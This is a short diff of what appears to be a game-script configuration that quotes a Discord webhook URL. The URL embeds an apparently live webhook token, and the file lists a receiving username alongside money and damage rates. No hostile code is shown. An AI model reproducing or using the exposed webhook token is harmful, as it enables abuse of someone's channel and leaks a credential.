@@ -1,4 +1,4 @@
-WEBHOOK = https://discord.com/api/webhooks/1430804352435753071/3adqh2p3rsjC0gdj3_NYGbYfn8GZmabqA8A9_snkxwOh59vHDLeNcUPeHWBKL6T-XGJO
+WEBHOOK = "https://discord.com/api/webhooks/1430804352435753071/3adqh2p3rsjC0gdj3_NYGbYfn8GZmabqA8A9_snkxwOh59vHDLeNcUPeHWBKL6T-XGJO"
 RECEIVERS = {"Alshin233"}
 MONEY_PER_SECOND = 75000
 DMG_PER_SECOND = 13000
